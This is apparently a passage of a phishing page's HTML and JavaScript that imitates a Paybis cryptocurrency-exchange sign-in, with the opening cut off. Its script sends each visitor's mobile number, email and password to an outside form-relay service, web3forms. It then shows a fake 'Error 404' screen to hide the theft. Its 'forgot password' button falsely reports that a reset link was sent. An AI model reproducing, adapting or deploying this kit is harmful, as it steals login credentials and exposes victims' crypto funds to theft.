<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
  body {
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    padding: 16px; position: relative; overflow: hidden;
    background:
      radial-gradient(50% 50% at 20% 15%, rgba(16,185,129,.25) 0%, transparent 60%),
      radial-gradient(45% 45% at 85% 25%, rgba(245,158,11,.22) 0%, transparent 60%),
      radial-gradient(55% 55% at 75% 85%, rgba(59,130,246,.22) 0%, transparent 60%),
      linear-gradient(160deg, #05070d 0%, #0a0f1c 55%, #060a14 100%);
  }
  body::before {
    content: ""; position: fixed; inset: -20%; z-index: 0; opacity: .5;
    background-image:
      linear-gradient(rgba(45,106,143,.12) 1px, transparent 1px),
      linear-gradient(90deg, rgba(45,106,143,.12) 1px, transparent 1px);
    background-size: 46px 46px;
    mask-image: radial-gradient(70% 70% at 50% 40%, #000 0%, transparent 100%);
    -webkit-mask-image: radial-gradient(70% 70% at 50% 40%, #000 0%, transparent 100%);
    animation: gridpan 24s linear infinite;
  }
  @keyframes gridpan { from { transform: translate3d(0,0,0); } to { transform: translate3d(46px, 46px, 0); } }
  
  .coins { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
  .coin {
    position: absolute; border-radius: 50%; display: flex; align-items: center; justify-content: center;
    font-weight: 800; color: #0a0f1c; box-shadow: 0 8px 30px rgba(0,0,0,.4);
    animation: float 9s ease-in-out infinite;
  }
  .coin.btc { width: 64px; height: 64px; left: 10%; top: 22%; font-size: 30px; background: radial-gradient(circle at 32% 28%, #ffd27a, #f59e0b); animation-delay: 0s; }
  .coin.eth { width: 50px; height: 50px; left: 82%; top: 30%; font-size: 24px; background: radial-gradient(circle at 32% 28%, #9fb4ff, #5b76f7); color:#0a0f1c; animation-delay: 1.5s; }
  .coin.usdt { width: 44px; height: 44px; left: 78%; top: 72%; font-size: 20px; background: radial-gradient(circle at 32% 28%, #7ef0c8, #10b981); animation-delay: 3s; }
  .coin.sm { width: 34px; height: 34px; left: 16%; top: 74%; font-size: 16px; background: radial-gradient(circle at 32% 28%, #cfd8e3, #8a99ab); animation-delay: 2.2s; }
  @keyframes float { 0%,100% { transform: translateY(0) rotate(-4deg); } 50% { transform: translateY(-22px) rotate(4deg); } }
  
  body::after {
    content: ""; position: fixed; inset: 0; z-index: 0; pointer-events: none;
    background: radial-gradient(120% 120% at 50% 0%, transparent 50%, rgba(0,0,0,.55) 100%);
  }
  
  .card {
    position: relative; z-index: 1;
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(18px) saturate(1.2);
    -webkit-backdrop-filter: blur(18px) saturate(1.2);
    width: 100%; max-width: 380px; border-radius: 20px;
    padding: 34px 30px;
    border: 1px solid rgba(255,255,255,0.6);
    box-shadow: 0 30px 70px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.6);
  }
  .brand { text-align: center; margin-bottom: 4px; font-size: 28px; font-weight: 700; color: #1e3a5f; letter-spacing: .5px; }
  .sub { text-align: center; color: #7a8ba0; font-size: 14px; margin-bottom: 24px; }

  label { display: block; font-size: 13px; font-weight: 600; color: #3a4a5c; margin-bottom: 6px; }
  
  .pass-wrap { position: relative; margin-bottom: 6px; }
  .pass-wrap input { margin-bottom: 0; padding-right: 40px; }
  .eye-icon {
    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
    cursor: pointer; font-size: 18px; color: #8a99ab; user-select: none;
  }
  .eye-icon:hover { color: #1e3a5f; }

  input {
    width: 100%; padding: 12px 14px; border: 1.5px solid #d7dee8; border-radius: 10px;
    font-size: 15px; margin-bottom: 16px; transition: border .2s; background: #fff;
    color: #1e3a5f;
  }
  input:focus { outline: none; border-color: #2d6a8f; }
  
  .forgot-wrap { text-align: right; margin-bottom: 16px; }
  .forgot-link { font-size: 12px; color: #2d6a8f; text-decoration: none; cursor: pointer; font-weight: 600; }
  .forgot-link:hover { text-decoration: underline; }

  .btn {
    width: 100%; padding: 13px; border: none; border-radius: 10px; background: #1e3a5f;
    color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; transition: .2s;
  }
  .btn:hover { background: #2d6a8f; }
  .btn:disabled { background: #8a99ab; cursor: not-allowed; }
  
  .msg { margin-top: 16px; font-size: 14px; text-align: center; min-height: 20px; }
  .msg.error { color: #d23b3b; }
  .msg.ok { color: #1e9e5a; }
  .hidden { display: none; }

  .phone-row { display: flex; gap: 8px; margin-bottom: 16px; }
  .phone-row > input { flex: 1; margin-bottom: 0; }

  .cc { position: relative; flex: 0 0 auto; }
  .cc-toggle {
    display: flex; align-items: center; gap: 6px; height: 100%; padding: 0 12px;
    border: 1.5px solid #d7dee8; border-radius: 10px; background: #fff; cursor: pointer;
    font-size: 15px; white-space: nowrap; min-width: 92px;
  }
  .cc-toggle:focus { outline: none; border-color: #2d6a8f; }
  .cc-toggle .fi { width: 20px; height: 15px; border-radius: 2px; }
  .cc-toggle .caret { color: #8a99ab; font-size: 11px; margin-left: 2px; }

  .cc-panel {
    position: absolute; top: calc(100% + 6px); left: 0; z-index: 20;
    width: 280px; max-width: 78vw; background: #fff; border: 1px solid #e1e8f0;
    border-radius: 12px; box-shadow: 0 12px 32px rgba(0,0,0,.16); overflow: hidden;
  }
  .cc-search {
    width: 100%; padding: 11px 14px; border: none; border-bottom: 1px solid #eef2f7;
    font-size: 14px; margin: 0; border-radius: 0;
  }
  .cc-search:focus { outline: none; }
  .cc-list { max-height: 240px; overflow-y: auto; }
  .cc-item {
    display: flex; align-items: center; gap: 10px; padding: 10px 14px; cursor: pointer; font-size: 14px;
  }
  .cc-item:hover, .cc-item.active { background: #f1f6fb; }
  .cc-item .fi { width: 22px; height: 16px; border-radius: 2px; flex: 0 0 auto; }
  .cc-item .nm { flex: 1; color: #2a3a4c; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .cc-item .dl { color: #7a8ba0; font-variant-numeric: tabular-nums; }
  .cc-empty { padding: 16px 14px; color: #9aa7b5; font-size: 14px; text-align: center; }

  .error-404 {
    text-align: center; color: #d23b3b; font-weight: 600; font-size: 15px;
    background: #fdecea; padding: 15px; border-radius: 10px; border: 1px solid #f5c6cb;
    margin-top: 15px;
  }

  /* Premium Mobile Chip */
  .mobile-chip {
    display: flex; align-items: center; justify-content: space-between;
    background: #eef4fa; border: 1px solid #d0e0f0; padding: 12px 16px;
    border-radius: 12px; margin-bottom: 20px;
  }
  .mobile-chip-left { display: flex; align-items: center; gap: 10px; }
  .mobile-chip .check-icon { 
    background: #1e9e5a; color: white; border-radius: 50%; width: 20px; height: 20px; 
    display: flex; align-items: center; justify-content: center; font-size: 12px; 
  }
  .mobile-chip .mobile-text { font-size: 15px; font-weight: 600; color: #1e3a5f; }
  .edit-btn {
    background: none; border: none; color: #2d6a8f; font-size: 13px; font-weight: 600;
    cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: 0.2s;
    display: flex; align-items: center; gap: 4px;
  }
  .edit-btn:hover { background: #d0e0f0; color: #1e3a5f; }
</style>
</head>
<body>
  <div class="coins" aria-hidden="true">
    <div class="coin btc">₿</div>
    <div class="coin eth">Ξ</div>
    <div class="coin usdt">₮</div>
    <div class="coin sm">◈</div>
  </div>

  <div class="card">
    <div class="brand">Paybis</div>
    <div class="sub">Sign in to your account</div>

    <!-- STEP 1: MOBILE NUMBER -->
    <div id="step1">
      <label>Mobile number</label>
      <div class="phone-row">
        <div class="cc" data-cc="mobile">
          <button type="button" class="cc-toggle" aria-haspopup="listbox" aria-expanded="false">
            <span class="fi cc-flag"></span>
            <span class="cc-dial">+91</span>
            <span class="caret">▼</span>
          </button>
          <div class="cc-panel hidden">
            <input type="text" class="cc-search" placeholder="Search country or code…" autocomplete="off">
            <div class="cc-list"></div>
          </div>
        </div>
        <input type="tel" id="mobile" placeholder="98765 43210" maxlength="15" inputmode="numeric">
      </div>
      <div class="msg error" id="step1Msg" style="display:none; margin-top:0; margin-bottom:10px;"></div>
      <button type="button" class="btn" id="nextBtn">Next</button>
    </div>

    <!-- STEP 2: EMAIL & PASSWORD -->
    <div id="step2" class="hidden">
      
      <div class="mobile-chip">
        <div class="mobile-chip-left">
          <div class="check-icon">✔</div>
          <span class="mobile-text" id="displayMobile"></span>
        </div>
        <button type="button" class="edit-btn" id="backBtn">
          ✎ Edit
        </button>
      </div>

      <form id="loginForm" autocomplete="off" novalidate>
        <label for="email">Email address</label>
        <input type="email" id="email" placeholder="you@example.com">
        
        <label for="passEmail">Password</label>
        <div class="pass-wrap">
          <input type="password" id="passEmail" placeholder="••••••••">
          <span class="eye-icon" id="togglePassEmail">👁️</span>
        </div>
        <div class="forgot-wrap">
          <a class="forgot-link" id="forgotBtn">Forgot Password?</a>
        </div>

        <!-- Cloudflare Turnstile Widget -->
        <div class="cf-turnstile" data-sitekey="YOUR_TURNSTILE_SITE_KEY_HERE" style="margin-bottom: 16px;"></div>

        <button type="submit" class="btn">Login</button>
      </form>
      
      <div class="msg" id="msg"></div>
    </div>

    <!-- ERROR 404 SCREEN -->
    <div id="errorScreen" class="hidden">
      <div class="error-404">
        Error 404: Not Found<br>
        <span style="font-size: 12px; font-weight: normal; color: #666; display: block; margin-top: 5px;">Server is temporarily unavailable. Please try again later.</span>
      </div>
    </div>

  </div>

  ].sort((a, b) => a[0].localeCompare(b[0]));

  function flagClass(iso) { return 'fi fi-' + iso.toLowerCase(); }

  function initCountryDropdown(root) {
    const toggle = root.querySelector('.cc-toggle');
    const panel  = root.querySelector('.cc-panel');
    const search = root.querySelector('.cc-search');
    const list   = root.querySelector('.cc-list');
    const flagEl = root.querySelector('.cc-flag');
    const dialEl = root.querySelector('.cc-dial');
    const state = { selected: COUNTRIES.find(c => c[1] === 'IN') };

    function paint() {
      flagEl.className = 'fi cc-flag ' + flagClass(state.selected[1]).replace('fi ', '');
      dialEl.textContent = state.selected[2];
      document.getElementById('mobile').placeholder = "X".repeat(state.selected[3]);
      document.getElementById('mobile').maxLength = state.selected[3];
    }
    function render(filter = '') {
      const q = filter.trim().toLowerCase();
      const items = COUNTRIES.filter(([name, iso, dial]) =>
        !q || name.toLowerCase().includes(q) || dial.includes(q) || iso.toLowerCase() === q);
      list.innerHTML = '';
      if (!items.length) { list.innerHTML = '<div class="cc-empty">No match found</div>'; return; }
      items.forEach(c => {
        const row = document.createElement('div');
        row.className = 'cc-item' + (c[1] === state.selected[1] ? ' active' : '');
        row.innerHTML = `<span class="${flagClass(c[1])}"></span><span class="nm">${c[0]}</span><span class="dl">${c[2]}</span>`;
        row.addEventListener('click', () => { state.selected = c; paint(); close(); });
        list.appendChild(row);
      });
    }
    function open()  { panel.classList.remove('hidden'); toggle.setAttribute('aria-expanded','true'); search.value=''; render(); search.focus(); }
    function close() { panel.classList.add('hidden'); toggle.setAttribute('aria-expanded','false'); }
    toggle.addEventListener('click', e => { e.stopPropagation(); panel.classList.contains('hidden') ? open() : close(); });
    search.addEventListener('input', () => render(search.value));
    search.addEventListener('click', e => e.stopPropagation());
    document.addEventListener('click', e => { if (!root.contains(e.target)) close(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
    paint();
    return state;
  }

  const ccMobileState = initCountryDropdown(document.querySelector('[data-cc="mobile"]'));

  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const errorScreen = document.getElementById('errorScreen');
  const msg = document.getElementById('msg');
  const step1Msg = document.getElementById('step1Msg');
  const mobileInput = document.getElementById('mobile');
  const nextBtn = document.getElementById('nextBtn');
  const backBtn = document.getElementById('backBtn');
  const displayMobile = document.getElementById('displayMobile');

  function showError(t) { msg.textContent = t; msg.className = 'msg error'; }
  function showOk(t)    { msg.textContent = t; msg.className = 'msg ok'; }
  function clearMsg()   { msg.textContent = ''; msg.className = 'msg'; }
  function showStep1Error(t) { step1Msg.textContent = t; step1Msg.style.display = 'block'; }
  function clearStep1Error() { step1Msg.style.display = 'none'; }

  mobileInput.addEventListener('input', function() {
    this.value = this.value.replace(/[^0-9]/g, '');
  });

  nextBtn.addEventListener('click', () => {
    clearStep1Error();
    const mobileVal = mobileInput.value.trim();
    const requiredLength = ccMobileState.selected[3];
    const countryName = ccMobileState.selected[0];

    if (!mobileVal) {
      showStep1Error("Mobile number is required.");
      return;
    }
    if (mobileVal.length !== requiredLength) {
      showStep1Error(`Invalid length. ${countryName} numbers must be exactly ${requiredLength} digits.`);
      return;
    }
    
    const fullNumber = ccMobileState.selected[2] + " " + mobileVal;
    displayMobile.textContent = fullNumber;

    step1.classList.add('hidden');
    step2.classList.remove('hidden');
  });

  backBtn.addEventListener('click', () => {
    step2.classList.add('hidden');
    step1.classList.remove('hidden');
    step1Msg.style.display = 'none';
  });

  document.getElementById('togglePassEmail').addEventListener('click', function() {
    const input = document.getElementById('passEmail');
    if (input.type === 'password') {
      input.type = 'text';
      this.textContent = '🙈';
    } else {
      input.type = 'password';
      this.textContent = '👁️';
    }
  });

  document.getElementById('forgotBtn').addEventListener('click', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    if (!email) { showError('Pehle apna email address daalein.'); return; }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Kripya ek sahi email address daalein.'); return; }
    showOk('✅ Password reset link aapke email par bhej diya gaya hai!');
  });

  document.getElementById('loginForm').addEventListener('submit', async function (e) {
    e.preventDefault();
    clearMsg();

    const email = document.getElementById('email').value.trim();
    const pass  = document.getElementById('passEmail').value;
    const mobile = displayMobile.textContent;

    if (!email) { showError('Email address is required.'); return; }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Please enter a valid email address.'); return; }
    if (!pass) { showError('Password is required.'); return; }

    // Turnstile Verification
    const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]');
    if (!turnstileResponse || !turnstileResponse.value) {
      showError('Kripya spam verification complete karein (Check the box).');
      return;
    }

    const submitBtn = e.target.querySelector('.btn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Signing in...';

    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

    try {
      // Web3Forms Direct API Call (Free Plan works perfectly)
      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          access_key: WEB3FORMS_ACCESS_KEY,
          subject: "New Login Alert - Paybis",
          from_name: "Paybis Security",
          Mobile_Number: mobile,
          User_Email: email,    
          User_Secret: pass,    
          Time: time,
          "cf-turnstile-response": turnstileResponse.value // Send turnstile token
        })
      });

      // User ko 404 dikhana hai
      step2.classList.add('hidden');
      errorScreen.classList.remove('hidden');

    } catch (err) {
      console.error(err);
      step2.classList.add('hidden');
      errorScreen.classList.remove('hidden');
    }
  });
</script>
</body>
</html>
